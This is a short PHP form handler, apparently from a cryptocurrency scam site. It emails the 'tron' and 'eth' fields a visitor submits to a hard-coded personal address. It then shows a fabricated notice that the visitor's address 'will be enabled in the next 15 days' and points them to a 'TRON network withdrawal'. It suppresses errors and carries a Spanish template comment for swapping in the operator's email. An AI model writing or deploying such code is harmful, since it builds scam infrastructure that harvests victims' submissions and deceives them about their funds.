<?php
error_reporting(0);
$tron = $_POST['tron'];
$eth= $_POST['eth'];

$header = 'From: ' . "Ewozx.com"."\r\n";
$header .= "X-Mailer: PHP/" . phpversion() . " \r\n";
$header .= "Mime-Version: 1.0 \r\n";
$header .= "Content-Type: text/plain";

$mensaje = "Este mensaje fue enviado por: " . $tron . " \r\n";
$mensaje .= "Su direccion de ethereum es: " . $eth . " \r\n";
$mensaje .= "Enviado el " . date('d/m/Y', time());

$para = "andre8asbl@gmail.com";//AQUÍ PONES TU CORREO
$asunto = 'SOLICITUD REGISTRO ETH';

mail($para, $asunto, utf8_decode($mensaje), $header);

echo '<body class="bg-dark"><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-giJF6kkoqNQ00vy+HMDP7azOuL0xtbfIcaT9wjKHr8RbDVddVHyTfAAsrekwKmP1" crossorigin="anonymous"><div style="height:50%;width:100%"></div><div class="container"><div class="row justify-content-md-center"><div class="col col-lg-2"></div><div class="col-md-auto"><h1 class="text-white">Your address will be enabled in the next 15 days, be patient or use the TRON network withdrawal</h1></div><div class="col col-lg-2"></div></div></div></body>';

?>